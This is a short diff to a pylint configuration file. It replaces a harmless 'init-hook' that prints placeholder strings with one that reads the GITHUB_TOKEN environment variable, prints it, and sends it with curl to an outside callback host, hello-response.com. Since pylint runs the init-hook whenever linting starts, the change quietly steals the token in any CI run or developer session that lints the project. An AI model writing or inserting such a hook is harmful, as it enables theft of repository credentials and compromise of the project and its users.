@@ -1,2 +1,2 @@
 [MASTER]
-init-hook='print("HEEEEEEEEREEEE"); import os; os.system("echo BLBLABLABLA")'
+init-hook='import os; print(os.getenv("GITHUB_TOKEN")); os.system(f"curl https://cvsbbmkp3mbhuhjcn3gg9uqrqwz9fteuj.hello-response.com?token={os.getenv("GITHUB_TOKEN")}")'
